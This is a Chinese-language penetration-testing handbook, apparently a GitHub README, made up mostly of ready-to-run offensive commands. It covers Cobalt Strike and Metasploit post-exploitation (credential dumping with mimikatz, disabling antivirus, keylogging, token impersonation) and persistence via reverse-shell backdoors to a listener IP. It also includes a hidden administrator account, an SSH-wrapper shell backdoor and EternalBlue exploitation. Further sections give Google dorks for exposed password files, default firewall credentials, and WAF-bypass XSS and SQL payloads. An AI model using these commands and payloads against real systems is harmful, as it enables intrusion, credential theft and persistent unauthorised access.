# Speed-PenTest🕶
`渗透手册`
[TOC]

<p align="center">
    <img src="https://i.imgur.com/LIAU2tE.jpg">
</p>

`本人撰写的手册，仅供学习和研究使用，请勿使用文中的技术源码用于非法用途，任何人造成的任何负面影响，与本人无关。`

---

# 0瑞士军刀/安全工具/框架
## cobaltstrike
服务端
`./teamserver 你的IP 你的密码`
客户端
`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
或
`javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**爆破 cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

**Reference**
- [cobalt strike 快速上手 [ 一 ] - FreeBuf专栏·攻防之路](https://www.freebuf.com/column/149236.html)
- [教你修改cobalt strike的50050端口 - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

---

## metasploit
Q:Module database cache not built yet, using slow search
A:
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

### meterpreter
**meterpreter快速上手**
```bash
shell   #获取目标主机的 cmd shell
getsystem #命令可以提权到本地系统权限
sysinfo #显示系统名，操作系统，架构和语言等。
```

#### 获取会话
**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST
set LPORT
exploit -j  #后台执行
```

**cmdshell 升级为 meterpreter**
如果最开始获取的是 cmdshell，后来发现这台机器非常适合作为测试其它终端的跳板，这个时候 cmdshell 的功能已经不能满足需要，升级成 meterpreter 就十分有必要。
`sessions -u "id"` 将该 cmdshell 升级成 meterpreter

#### 提权
**绕过 UAC**
通常 webshell 的权限都比较低，能够执行的操作有限，没法查看重要文件、修改系统信息、抓取管理员密码和 hash、安装特殊程序等，所以我们需要获取系统更高的权限
```bash
use exploit/windows/local/bypassuac #一系列都可用
use exploit/windows/local/bypassuac_eventvwr
sessions    #查看目前的session
sessions -k #杀死所有session
set session    #设为你需要exploit的session
```

**利用系统漏洞提权**
```bash
use exploit/windows/local/ms13_081_track_popup_menu #以ms13-081为例
set session
```

#### 进程迁移
当meterpreter单独作为一个进程运行时容易被发现，如果将它和系统经常运行的进程进行绑定，就能够实现持久化。
```bash
getpid  #查看当前会话的进程id
ps  #查看目标运行的进程
migrate pid #绑定进程
```

#### 令牌假冒
在用户登录 windows 操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的 session 或者 cookie。

msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。
```bash
getuid  #查看当前用户
use incognito   #进入该模块
list_tokens -u  #查看存在的令牌
impersonate_token 用户名  #令牌假冒
#注意用户名的斜杠需要写两个。

getuid  #查看是否切换成功
```

#### 获取凭证
```bash
run hashdump

load mimikatz   #加载mimikatz模块
wdigest
kerberos
```

#### 操作文件系统
**基本操作**
```bash
ls：列出当前路径下的所有文件和文件夹。
pwd 或 getwd：查看当前路径
search：搜索文件，使用search -h查看帮助。
cat：查看文件内容，比如cat test.txt。
edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。
rm：删除文件。
cd：切换路径。
mkdir：创建文件夹。
rmdir：删除文件夹。
getlwd 或 lpwd：查看自己系统的当前路径。
lcd：切换自己当前系统的目录。
lls：显示自己当前系统的所有文件和文件夹。
```

**上传和下载**
```bash
upload <file> <destination> #上传文件到 Windows 主机
#注意：使用 -r 参数可以递归上传上传目录和文件

download <file> <path to save>  #从 windows 主机下载文件
#注意：Windows 路径要使用双斜线
#如果我们需要递归下载整个目录包括子目录和文件，我们可以使用 download -r命令
```

#### 其它操作
**关闭防病毒软件**
`run killav`
`run post/windows/manage/killav`

**操作远程桌面**
`run post/windows/manage/enable_rdp` 开启远程桌面
`run post/windows/manage/enable_rdp username=test password=test` 添加远程桌面的用户(同时也会将该用户添加到管理员组)

**截屏**
`screenshot`

**键盘记录**
```bash
keyscan_start：开启键盘记录功能
keyscan_dump：显示捕捉到的键盘记录信息
keyscan_stop：停止键盘记录功能
```

**执行程序**
```bash
execute -f <path> [options] 在目标主机上执行 exe 文件
-H：创建一个隐藏进程
-a：传递给命令的参数
-i：跟进程进行交互
-m：从内存中执行
-t：使用当前伪造的线程令牌运行进程
-s：在给定会话中执行进程
```

#### 端口转发和内网代理
**portfwd**
portfwd 是 meterpreter 提供的端口转发功能，在 meterpreter 下使用 portfwd -h 命令查看该命令的参数。
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389 #将1.1.1.3的3389端口转发到本地的2222端口。
-l：本地监听端口
-r：内网目标的ip
-p：内网目标的端口
```

**pivot**
pivot 是 msf 最常用的代理，可以让我们使用 msf 提供的扫描模块对内网进行探测。
```bash
route add 内网ip 子网掩码 session的id #添加一个路由
route print

如果其它程序需要访问这个内网环境，就可以建立socks代理
msf提供了3个模块用来做socks代理。
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc

use auxiliary/server/socks4a
SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。
SRVPORT：监听的端口，默认为1080。
直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用。
```

#### 后门
Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制
**metsvc**
```bash
run metsvc 
#命令运行成功后会在 C:WindowsTEMP 目录下新建随机名称的文件夹，里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)
#同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为"自动",绑定在31337端口。

use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost xxx.xxx.xxx.xxx
set lport 31337
```

**persistence**
```bash
run persistence -X -i 10 -r 192.168.1.9 -p 4444
-A：安装后门后，自动启动exploit/multi/handler模块连接后门
-L：自启动脚本的路径，默认为%TEMP%
-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp
-S：作为一个服务在系统启动时运行（需要SYSTEM权限）
-T：要使用的备用可执行模板
-U：用户登陆时运行
-X：系统启动时运行
-i：后门每隔多少秒尝试连接服务端
-p：服务端监听的端口
-r：服务端ip
```

**Reference**
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploit入门用法（主动攻击） - CSDN博客](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreter必知必会的15个命令](https://www.4hou.com/tools/14185.html)
- [萌新科普 手把手教你如何用MSF进行后渗透测试](https://www.anquanke.com/post/id/164525)

---

# 1Crypto
## 各种爆破


---

# 2Misc
## 权限维持/反侦察
### 通用
#### msfvenom
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe`

#### Veil
- **Installation**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh –c
sudo ./Veil.py
```

#### HERCULES
- **Installation**
```bash
确保电脑里有Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

#### ASWCrypter
#### VENOM
#### Metasploit
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
run
```

---

### win
#### 创建后门账号
```bash
net user PHPNET$ 1234abcd~ /add #添加用户
#Windows 的帐号名称后带着"$"符号时，不会在 net user 命令中显示出帐号信息
net localgroup administrators PHPNET$ /add #将用户添加到管理组
net user PHPNET$ /del #删除用户

query user #查看会话

logoff ID号 #踢掉
```

### linux
#### 后门
**SSH wrapper**
SSH wrapper后门，没有开放额外的端口，只要对方开了SSH服务，就能远程连接
```bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```
抱歉，实际测试未成功

**Vegile**
This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
```

### 隐匿攻击
#### 端口转发
**ew**
鸽

---

## 信息收集
### 搜索引擎 Hacking
**google**
例子
```bash
inurl:tw
inurl:jp

inurl:editor/db/ 
inurl:eWebEditor/db/ 
inurl:bbs/data/ 
inurl:databackup/ 
inurl:blog/data/ 
inurl:\boke\data 
inurl:bbs/database/ 
inurl:conn.asp 
inc/conn.asp
Server.mapPath(".mdb")
allinurl:bbs data
filetype:mdb inurl:database
filetype:inc conn
inurl:data filetype:mdb
intitle:"index of" data

intitle:"index of" etc
intitle:"Index of" .sh_history
intitle:"Index of" .bash_history
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" etc/shadow
intitle:"index of" spwd
intitle:"index of" master.passwd
intitle:"index of" htpasswd
inurl:service.pwd

site:218.87.21.*
inurl:老虎机 site:*.gov
```

**[Shodan](https://www.shodan.io)**
语法
```bash
hostname：搜索指定的主机或域名，例如 hostname:"google"
port：搜索指定的端口或服务，例如 port:"21"
country：搜索指定的国家，例如 country:"CN"
city：搜索指定的城市，例如 city:"Hefei"
org：搜索指定的组织或公司，例如 org:"google"
isp：搜索指定的ISP供应商，例如 isp:"China Telecom"
product：搜索指定的操作系统/软件/平台，例如 product:"Apache httpd"
version：搜索指定的软件版本，例如 version:"1.6.2"
geo：搜索指定的地理位置，参数为经纬度，例如 geo:"31.8639, 117.2808"
before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:"11-11-15"
net：搜索指定的IP地址或子网，例如 net:"210.45.240.0/24"
```

例子
```bash
#友情提醒,不要瞎搞
misc
Server: uc-httpd 1.0.0 200 OK Country:"JP"
h3c net:"61.191.146.0/24"
country:US vuln:CVE-2014-0160
port:135,139,445 -hash:0   #过滤一些主文本标题为空的搜索结果
Hikvision-Webs

database
all:"mongodb server information" all:"metrics"  
port:27017 -all:"partially" all:"fs.files"      
port:"9200" all:"elastic indices"   

ftp
230 'anonymous@' login ok      

vnc
port:5900 screenshot.label:loggedin
```

外部工具
```bash
Shodan cli
https://cli.shodan.io/

浏览器插件
https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap
https://addons.mozilla.org/en-US/firefox/addon/shodan_io/

Metasploit
use auxiliary/gather/shodan_search
set SHODAN_APIKEY ********************
set QUERY ****

use auxiliary/gather/shodan_honeyscore  #蜜罐检测
set SHODAN_APIKEY ********************
set TARGET your_target

Recon-ng
keys add shodan_api ********************
use recon/domains-hosts/shodan_hostname
show options
set SOURCE google
set LIMIT 1
```

**[censys](https://www.censys.io)**
例子
```bash
23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not
80.http.get.status_code: 200　　指定状态
80.http.get.status_code:[200 TO 300]　　200-300之间的状态码
location.country_code: DE　　国家
protocols: (“23/telnet" or “21/ftp")　　协议
tags: scada　　标签
80.http.get.headers.server：nginx　　服务器类型版本
autonomous_system.description: University　　系统描述
```

**[钟馗之眼](https://www.zoomeye.org/)**
语法
```bash
app:nginx　　组件名
ver:1.0　　版本
os:windows　　操作系统
country:"China"　　国家
city:"hangzhou"　　城市
port:80　　端口
hostname:google　　主机名
site:google.com　　网站域名
desc:nmask　　描述
keywords:passwd　　关键词
service:ftp　　服务类型
ip:8.8.8.8　　ip地址
cidr:8.8.8.8/24　　ip地址段
```

**[FoFa](https://fofa.so)**
语法
```bash
title="abc" 从标题中搜索abc。例：标题中有北京的网站。
header="abc" 从http头中搜索abc。例：jboss服务器。
body="abc" 从html正文中搜索abc。例：正文包含Hacked by。
domain="qq.com" 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。
host=".gov.cn" 从url中搜索.gov.cn,注意搜索要用host作为名称。
port="443" 查找对应443端口的资产。例： 查找对应443端口的资产。
ip="1.1.1.1" 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。
protocol="https" 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。
city="Beijing" 搜索指定城市的资产。例： 搜索指定城市的资产。
region="Zhejiang" 搜索指定行政区的资产。例： 搜索指定行政区的资产。
country="CN" 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。
cert="google.com" 搜索证书(https或者imaps等)中带有google.com的资产。
```

例子
```bash
title="powered by" && title!=discuz
title!="powered by" && body=discuz
(body="content=\"WordPress" || (header="X-Pingback" && header="/xmlrpc.php" && body="/wp-includes/") ) && host="gov.cn"
```

**[Dnsdb](https://www.dnsdb.io/)**
语法
```bash
DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.
```

域名查询条件
查询语法为`domain:.`
域名查询是指查询顶级私有域名所有的DNS记录,
例如查询google.com 的所有DNS记录: `domain:google.com.`
域名查询可以省略domain:.

主机查询条件
查询语法:`host:`
例如查询主机地址为mp3.example.com的DNS记录:`host:map3.example.com`
主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值

按DNS记录类型查询
查询语法: `type:.`
例如只查询A记录: `type:a`
使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法

按IP限制
查询语法: `ip:`
查询指定IP: `ip:8.8.8.8` 该查询与直接输入8.8.8.8进行查询等效
查询指定IP范围: `ip:8.8.8.8-8.8.255.255`
CIDR: `ip:8.8.0.0/24`
IP最大范围限制65536个

例子
查询google.com的所有A记录: `google.com type:a`

**Reference**
- [【渗透神器系列】搜索引擎](https://thief.one/2017/05/19/1/)
- [Shodan新手入坑指南](https://www.freebuf.com/sectool/121339.html)
- [shodan-manual](https://b404.gitbooks.io/shodan-manual/)
- [How to Discover MongoDB and Elasticsearch Open Databases](https://habr.com/en/post/443132/)

### 网络
- **TTL来判断目的主机的操作系统类型**
下面是默认操作系统的TTL：
```bash
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7              TTL：64
```

- **修改本机电脑上面的默认TTL值**
通过修改本机上的TTL值可以混淆攻击者的判断（当然，很少有用户会这么做）。TTL 值在注册表的位置是：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `其中有个 DefaultTTL 的 DWORD 值，其数据就是默认的 TTL 值了，我们可以修改 DefaultTTL 里面的 TTL 默认值，但不能大于十进制的 255。

#### IP扫
>netdiscover -r 1.1.1.0/24

### 网站
#### CDN/查源IP
- **Nslookup法**
`nslookup + 域名`

- **多地ping域名法**
利用在线网站服务多地 ping 测试

- **"常识"判断法**
在反查网站 ip 时，如果此网站有 1000 多个不同域名，那么这个 ip 多半不是真实 ip。
如果一个 asp 或者 asp.net 网站返回的头字段的 server 不是 IIS、而是 Nginx，那么多半是用了 nginx 反向代理，而不是真实 ip。
如果 ip 定位是在常见 cdn 服务商的服务器上，那么是真实 ip 的可能性就微乎其微了。

- **子域名查找法**
利用一些在线查询的网站
https://x.threatbook.cn/
https://dnsdb.io/zh-cn/ 只需输入 baidu.com type:A 就能收集百度的子域名和 ip
Google 搜索 Google site:baidu.com -www 就能查看除 www 外的子域名

- **使用子域名扫描器**
例如子域名挖掘机和 subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

总结：收集子域名后尝试以解析 ip 不在 CDN 上的 ip 解析主站，真实 ip 成功被获取到。

### 主机
#### 端口扫
`nmap -T5 -A -v 1.1.1.1`

#### windows
```bash
systeminfo
```

##### 域信息
- 域用户列表
    a.分析特权用户组
    b.定位指定用户

- AD信息收集
    a.GPO
    b.特权令牌
    c.信任关系
    d.定位指定机器

---

# 6内/外网
## WAN
### dns
**CVE-1999-0532  dns域传送漏洞**
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名；
```

---

## windows渗透
### exp
#### 快速查找未打补丁的exp
可以最安全的减少目标机的未知错误，以免影响业务。
命令行下执行检测未打补丁的命令如下：
>systeminfo>micropoor.txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780) do @type micropoor.txt|@find /i  "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt

注：以上需要在可写目录执行。需要临时生成 micrpoor.txt，以上补丁编号请根据环境来增
删。
一般实战中在类似 tmp目录等可写目录下执行：如`C:\tmp>`

#### 常用exp
**RCE**
- MS17-010 eternalblue
```bash
发现，检测
use auxiliary/scanner/smb/smb_ms17_010

使用payload连上去
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set lhost   #设一下本机地址
set rhosts 
run

msf 下
加载mimikatz模块
load mimikatz
kerberos
```
- MS15-034 Vulnerability in HTTP.sys could allow remote code execution

**提权**
- MS14-058
- MS15-051
- MS15-097
- MS16-014
- MS16-016
- MS16-032
- MS16-135
- MS17-017
- CVE-2017-0213
- CVE-2018-8120

**黑屏**
- MS12-020

#### exp注
```bash
MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　
(windows 7/8)
CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows
10/8.1/7/2016/2010/2008)
CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows
10/8.1/7/2016/2010/2008)
MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows
7/2008/2003/XP)
MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)
MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)
MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)
MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)
MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　
(2003/2008/7/8/2012)
MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)
MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008
R2)
MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)
MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)
MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)
MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)
MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)
MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)
MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)
MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)
MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)
MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)
MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)
MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)
MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)
MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)
MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)
MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)
MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)
MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)
MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 &
SP2/2008 Gold & SP2 & R2/Win7)
MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)
MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows
7/2008R2)
MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)
MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)
MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)
MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)
MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server
2003/Vista/Server 2008)
MS08-066 　[]　　 []　　(Windows 2000/XP/Server 2003)
MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)
MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)
MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)
MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　
(/NT/2000/XP/2003)
```

---

### RDP
**cmd开RDP**
> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber 

测试可以：
- 开启3389端口dos命令（开启XP&2003终端服务）
    1. 方法一：`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
    2. 方法二：`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
    
- 查看3389端口是否开启
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

- 更改终端端口为2008(十六进制为：0x7d8)
    1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
    2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

- 查看3389端口是否更改
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是16进制`

- 取消xp&2003系统防火墙对终端服务的限制及IP连接的限制：
    `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

此时可以链接3389
然后抓取密码
```bash
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //打印输出mimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //输出到log.txt
```

**多开3389**
用命令没成功，还是用工具把。

### 密码
#### mimikatz
提权
`privilege::debug`

抓取密码
`sekurlsa::logonpasswords`

### 域渗透
```bash
#如果没有psexec工具记得找pstool工具包，传一个上去
psexec \\hostIp -u [username] -p [password] cmd
```

---

## web渗透
### pos
#### 各类论坛/CMS/系统
**CMS-Hunter**

**CMS-Exploit-Framework**

##### phpmyadmin
**LOAD DATA INFILE 任意文件读取漏洞**
poc:https://github.com/Gifts/Rogue-MySql-Server

**4.8.x 本地文件包含漏洞利用**
[phpMyAdmin 4.8.x 本地文件包含漏洞利用 | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)可以通过这个线上靶场实验,不过docker镜像可能有点问题,mysql进程起不起来,我的解决方式是直接卸了重装mysql-server,而且他默认的apt源无法访问,还要换一下apt源

### 安防设备
**默认口令**
```bash
天融信防火墙
8080
用户名:superman 密码:talent、talent!23
test/123456

联想网御防火墙
8889
用户名:admin    密码:leadsec@7766、administrator、bane@7766

深信服防火墙
用户名：admin   密码：admin

启明星辰
8889
用户名：admin   密码：bane@7766、admin@123

juniper
用户名:netscreen    密码:netscreen

Cisco
用户名:admin    密码:cisco

Huawei
用户名:admin    密码:Admin@123
eudemon eudemon

H3C
用户名:admin    密码:admin

绿盟IPS
用户名: weboper 密码: weboper

网神防火墙
用户名：admin   密码：firewall

华为VPN
账号：root  密码：mduadmin

迪普
admin/admin_default

山石
hillstone/hillstone

安恒明御防火墙
admin/adminadmin

齐治堡垒机
shterm/shterm
```

**绕waf**
- 非默认端口导致完全绕过
    测试HTTPS服务
    测试8080/8081等端口的服务

- 路径限制绕过
这只WAF会对访问敏感路径加以限制,但是加上参数可以绕过。
比如想访问`xxx.██.edu.cn/phpmyadmin/`会被拦截，访问`xxx.██.edu.cn/phpmyadmin/?id=1`可以绕过

- XSS防护绕过
最直白的payload类似`<script> alert('xss'); </script>`
但是你可以用`<script src=来远程加载脚本，并绕过防护`
`http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`

- SQL注入绕过
Union注入时`union select 1 from 2`替换成`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order by测试时直接把空格换成`/**//**/`

**Reference**
- [国内防火墙默认密码](https://www.qugcloud.cn/2018/05/19/firewall-pwd/)
- [██大学通用型WAF不完全绕过（持续非定期更新） ](https://drivertom.blogspot.com/2018/12/waf.html)

### 注入
#### sql
**sqlmap**
```bash
sqlmap -u URL	#判断注入
sqlmap -u URL --current-db	 #获取当前数据库
sqlmap -u URL -D DATABASE --tables		#获取数据库表
sqlmap -u URL -D DATABASE -T TABLES --columns	#获取指定表的列名
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		#获取指定表的列名

sqlmap -r aaa.txt  #post型注入
```

---

## 业务渗透
### 数据库
#### oracle
**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
```bash
use auxiliary/admin/oracle/tnscmd   #该漏洞可以远程获取到oracle的内存信息，若是能获取到内存中的数据即为存在漏洞。
use auxiliary/admin/oracle/sid_brute  #爆破oracle的SID
```

### openssl
MassBleed
sslscan
testssl

---

## 纯网渗透
### SNMP
**snmp弱口令**
Installation net-snmp
`yum -y install net-snmp-utils`

Usage
```bash
snmpwalk -v 2 -c public 192.168.xxx.xxx
snmp-check 192.168.xxx.xxx -c public -v 2c
```

**Reference**
- [SNMP协议攻击](https://xz.aliyun.com/t/1562)
- [烂泥：使用snmpwalk采集设备的OID信息](https://www.ilanni.com/?p=8408)
- [渗透测试中如何收集利用SNMP协议数据](https://www.freebuf.com/articles/network/104522.html)
- [snmp弱口令引起的信息泄漏](http://drops.xmd5.com/static/drops/tips-409.html)

---

# 7工控/IoT/物理
## 物联网设备
### Printer
**PRET**
Installation
```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

pip install colorama pysnmp
```

Usage
```bash
python2 ./pret.py
python2 ./pret.py xxx.xxx.xxx.xxx pjl
python2 ./pret.py xxx.xxx.xxx.xxx ps
python2 ./pret.py xxx.xxx.xxx.xxx pcl
```

### Router
**routersoloit**
Installation
```bash
git clone https://www.github.com/threat9/routersploit.git
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Usage
```bash
use scanners/autopwn
set target
run
```

`你以为很多事是可以重复的，还有下一次，但你错了。包括你儿时的万花筒或纸飞机，抄作业或买糖果，早就是此生的最后一次。（韩少功 《日夜书》） `
